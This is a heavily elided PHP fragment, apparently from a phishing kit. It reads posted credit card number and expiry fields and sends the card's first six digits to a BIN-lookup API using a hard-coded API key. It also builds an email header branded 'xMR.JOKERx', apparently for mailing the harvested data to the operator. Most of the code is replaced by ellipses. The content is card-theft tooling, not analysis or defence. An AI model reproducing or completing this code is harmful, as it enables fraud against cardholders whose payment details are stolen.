...
*/
 ...
 if(isset($_POST['ccn'])&&isset($_POST['cex'])){
	...
	$bin=substr(str_replace(' ','',$ccn),0,6);
		...
		curl_setopt($ch,CURLOPT_URL,"https://api.bincodes.com/bin-checker.php?api_key=2bbdc9f3fb30118c4a380db585adda76&bin=".$bin."&format=json");
...
$headers="From: ♪♫♩xMR.JOKERx♪♫♩ <newlinked@xMR.JOKERx.com>\r\n";
